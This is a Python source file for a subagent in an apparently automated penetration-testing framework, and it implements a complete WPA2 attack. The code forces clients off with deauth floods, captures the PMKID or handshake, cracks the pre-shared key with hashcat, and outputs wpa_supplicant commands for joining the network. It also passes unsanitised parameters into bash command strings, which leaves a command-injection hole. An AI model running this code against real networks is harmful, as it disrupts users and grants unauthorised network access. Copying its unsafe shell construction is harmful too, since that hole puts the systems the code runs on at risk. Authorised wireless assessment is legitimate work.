"""
wpa2_crack_subagent.py — WPA2 handshake capture and offline cracking.

AGENT_NAME  : "wireless"
SUBAGENT_NAME: "wpa2_crack"

Methodology:
  1. Target specific BSSID on channel for focused capture
  2. Capture WPA2 4-way handshake (airodump-ng)
  3. Accelerate with deauth attack (aireplay-ng -0) to force reconnect
  4. Try PMKID attack first (no deauth needed — hcxdumptool)
  5. Convert capture to hashcat format (hcxtools / cap2hccapx)
  6. Crack with hashcat (mode 22000 PMKID/EAPOL or mode 2500 legacy)
  7. Report cracked PSK for engagement evidence
"""
from __future__ import annotations
import logging, re
from typing import Any
from agents.base_subagent import BaseSubagent, Finding, SubagentResult

logger = logging.getLogger(__name__)

_HS_RE      = re.compile(r'(WPA handshake|handshake.*captured|EAPOL)', re.I)
_CRACK_RE   = re.compile(r'(Cracked|key found|PSK\s*=|Password\s*=|ALL HASHES FOUND)', re.I)
_PSK_RE     = re.compile(r'(?:key found|psk|password)\s*[=:]\s*["\']?(\S+)["\']?', re.I)
_PMKID_RE   = re.compile(r'(PMKID|pmkid)', re.I)


class Wpa2CrackSubagent(BaseSubagent):
    """Capture WPA2 handshake and crack the pre-shared key."""

    AGENT_NAME    = "wireless"
    SUBAGENT_NAME = "wpa2_crack"

    async def run(self, target: str, bssid: str = "",
                  essid: str = "",
                  channel: int = 6,
                  interface: str = "wlan0",
                  client_mac: str = "",
                  capture_duration: int = 60,
                  wordlist: str = "/usr/share/wordlists/rockyou.txt",
                  evidence_dir: str = "/tmp/pentest_evidence",
                  **kwargs: Any) -> SubagentResult:
        result = SubagentResult(session_id=self.session_id, subagent_name=self.SUBAGENT_NAME, target=target)

        await self.collect_tool("bash", target,
            {"options": f"-c \"mkdir -p {evidence_dir}/wireless\""})

        cap_prefix = f"{evidence_dir}/wireless/wpa2_{bssid.replace(':', '') if bssid else 'target'}"
        mon_iface  = interface + "mon" if "mon" not in interface else interface

        # ── Verify monitor mode ────────────────────────────────────────
        mode_out = await self.collect_tool("bash", target,
            {"options": f"-c \"iwconfig {mon_iface} 2>/dev/null | grep Mode\""})
        if "Monitor" not in mode_out:
            # Try to enable
            await self.collect_tool("bash", target,
                {"options": f"-c \"airmon-ng check kill 2>/dev/null; airmon-ng start {interface} 2>/dev/null\""})

        # ── PMKID capture (preferred — no deauth) ─────────────────────
        hcx_check = await self.collect_tool("bash", target,
            {"options": "-c \"which hcxdumptool hcxpcapngtool 2>/dev/null\""})
        has_hcx = "hcxdumptool" in hcx_check

        pmkid_captured = False
        if has_hcx and bssid:
            safe_bssid = bssid.replace(':', '').lower()
            # Create filter file
            await self.collect_tool("bash", target,
                {"options": f"-c \"echo '{bssid.lower()}' > /tmp/ap_filter.txt\""})

            pmkid_out = await self.collect_tool("bash", target,
                {"options": f"-c \"timeout {capture_duration} hcxdumptool -i {mon_iface} --filterlist_ap=/tmp/ap_filter.txt --filtermode=2 -o {cap_prefix}_pmkid.pcapng 2>&1; echo DONE\""})

            pmkid_captured = _PMKID_RE.search(pmkid_out) is not None or "DONE" in pmkid_out

            if pmkid_captured:
                # Convert to hashcat format
                conv_out = await self.collect_tool("bash", target,
                    {"options": f"-c \"hcxpcapngtool -o {cap_prefix}_pmkid.hc22000 {cap_prefix}_pmkid.pcapng 2>&1; echo CONVERTED\""})

                await self.store_finding(Finding(
                    title=f"WPA2: PMKID Capture {'Successful' if 'CONVERTED' in conv_out else 'Attempted'} — {bssid}",
                    description=f"PMKID captured from {essid or bssid} without client interaction. Ready for offline cracking.",
                    severity="HIGH",
                    evidence=pmkid_out[:400] + "\n" + conv_out[:200], tool="bash", host=target,
                    mitre_technique="T1056",
                    exploit_suggestion=f"Crack: hashcat -m 22000 {cap_prefix}_pmkid.hc22000 {wordlist} --force",
                ))

                # Crack PMKID
                crack_out = await self.collect_tool("bash", target,
                    {"options": f"-c \"hashcat -m 22000 {cap_prefix}_pmkid.hc22000 {wordlist} --force --status --status-timer=10 2>&1 | tail -20; echo CRACK_DONE\""})
                psk_match = _PSK_RE.search(crack_out)
                cracked = _CRACK_RE.search(crack_out)

                if cracked or psk_match:
                    psk = psk_match.group(1) if psk_match else "(see output)"
                    await self.store_finding(Finding(
                        title=f"WPA2 CRACKED (PMKID): '{essid or bssid}' — PSK = {psk}",
                        description=f"WPA2 pre-shared key recovered via PMKID attack: {psk}",
                        severity="CRITICAL",
                        evidence=crack_out[:600], tool="bash", host=target,
                        mitre_technique="T1056",
                        exploit_suggestion=f"Connect: wpa_passphrase '{essid}' '{psk}' > /tmp/wpa.conf; wpa_supplicant -i {interface} -c /tmp/wpa.conf",
                    ))
                else:
                    await self.store_finding(Finding(
                        title=f"WPA2: PMKID Crack Failed — PSK Not in Wordlist",
                        description=f"Wordlist exhausted ({wordlist}). Try rules: hashcat -m 22000 ... -r /usr/share/hashcat/rules/best64.rule",
                        severity="MEDIUM",
                        evidence=crack_out[:400], tool="bash", host=target,
                        mitre_technique="T1056",
                        exploit_suggestion=f"Rule-based: hashcat -m 22000 {cap_prefix}_pmkid.hc22000 {wordlist} -r /usr/share/hashcat/rules/best64.rule",
                    ))

        # ── Handshake capture (classic method) ────────────────────────
        if not pmkid_captured and bssid:
            # Start airodump-ng to capture
            dump_out = await self.collect_tool("bash", target,
                {"options": f"-c \"timeout {capture_duration} airodump-ng -c {channel} --bssid {bssid} -w {cap_prefix} --output-format cap {mon_iface} 2>&1 &\""})

            # Send deauth to force reconnect
            if client_mac:
                deauth_target = client_mac
            else:
                deauth_target = "FF:FF:FF:FF:FF:FF"  # broadcast deauth

            deauth_out = await self.collect_tool("bash", target,
                {"options": f"-c \"sleep 5; aireplay-ng -0 5 -a {bssid} -c {deauth_target} {mon_iface} 2>&1; echo DEAUTH_DONE\""})

            # Check for handshake
            hs_out = await self.collect_tool("bash", target,
                {"options": f"-c \"aircrack-ng {cap_prefix}-01.cap 2>&1 | grep -iE 'WPA|handshake|BSSID' | head -10\""})
            has_hs = _HS_RE.search(hs_out) is not None

            await self.store_finding(Finding(
                title=f"WPA2: Handshake {'CAPTURED' if has_hs else 'Not Yet Captured'} — {bssid}",
                description=f"Deauth sent ({deauth_target}), waiting for client reconnect. Handshake: {has_hs}.",
                severity="HIGH" if has_hs else "MEDIUM",
                evidence=deauth_out[:300] + "\n" + hs_out[:200], tool="bash", host=target,
                mitre_technique="T1056",
                exploit_suggestion=f"Convert + crack: cap2hccapx {cap_prefix}-01.cap {cap_prefix}.hccapx; hashcat -m 2500 {cap_prefix}.hccapx {wordlist}" if has_hs else None,
            ))

            if has_hs:
                # Try cap2hccapx or hcxpcapngtool
                conv_out = await self.collect_tool("bash", target,
                    {"options": f"-c \"cap2hccapx {cap_prefix}-01.cap {cap_prefix}.hccapx 2>/dev/null && echo CONV_OK || hcxpcapngtool -o {cap_prefix}.hc22000 {cap_prefix}-01.cap 2>&1 && echo CONV_OK\""})
                if "CONV_OK" in conv_out:
                    hs_file = f"{cap_prefix}.hccapx" if "hccapx" in conv_out else f"{cap_prefix}.hc22000"
                    crack_mode = "2500" if "hccapx" in hs_file else "22000"

                    crack_out = await self.collect_tool("bash", target,
                        {"options": f"-c \"hashcat -m {crack_mode} {hs_file} {wordlist} --force --status --status-timer=10 2>&1 | tail -20\""})
                    psk_match = _PSK_RE.search(crack_out)
                    if psk_match:
                        psk = psk_match.group(1)
                        await self.store_finding(Finding(
                            title=f"WPA2 CRACKED (Handshake): '{essid or bssid}' — PSK = {psk}",
                            description=f"WPA2 handshake cracked. PSK: {psk}",
                            severity="CRITICAL",
                            evidence=crack_out[:600], tool="bash", host=target,
                            mitre_technique="T1056",
                            exploit_suggestion=f"Connect: wpa_passphrase '{essid}' '{psk}' > /tmp/wpa.conf; wpa_supplicant -i {interface} -c /tmp/wpa.conf",
                        ))

        result.findings    = list(self._findings)
        result.tool_outputs = dict(self._tool_outputs)
        return result
